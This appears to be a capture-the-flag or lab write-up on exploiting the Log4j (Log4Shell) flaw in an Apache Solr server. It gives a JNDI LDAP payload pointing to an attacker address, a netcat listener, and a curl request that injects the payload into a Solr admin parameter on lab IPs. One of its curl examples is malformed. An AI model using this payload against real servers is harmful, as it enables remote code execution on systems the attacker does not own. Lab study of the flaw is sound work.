# Using Log4j to attack a vulnerable Apache Solar server. [Java 1.8.0_181]

## Dashboard seen on admin front page

## Verify that log4j in use for logging via nmap scan (all ports) - note info on dashboard as well\


## Note log directory...
```-Dsolr.log.dir```

## In logs, find an entry point 

INFO entries with repeated endpoint requests -> parameter field

## Parameter will be used as an attack vector, with a payload having syntax as follows

``` ${jndi:ldap://ATTACKERADDRESS} ```

Using JNDI to get external resources, ATTACKERADDRESS will be a nc listener on the kali machine.

```$ nc -lnvp 4444```

## Idea behind Remote Code Execution
 - Log4j processes logs by parsing entries, but may EXECUTE code in entry 
 - Anywhere data is logged, is vulnerable to the syntax --- we should have identified an entry point from the logs earlier (we are sure that it will log and be processed)
  - Entry poiunt can also include forms/any source of user supplied data HTTP headers, 

Putting things together, here is an example of a maliciously crafted curl request:

```$ curl 'http://10.10.22.239:8983/solr/admin/cores?foo=$\{10.9.1.93:4444\}'```

This payload will be delivered and executed by Log4j  during parsing...
```sh
┌──(kali㉿kali)-[~]
└─$ curl 'http://10.10.22.239:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.1.93:4444\}' 
{
  "responseHeader":{
    "status":0,
    "QTime":0},
  "initFailures":{},
  "status":{}}
  ```
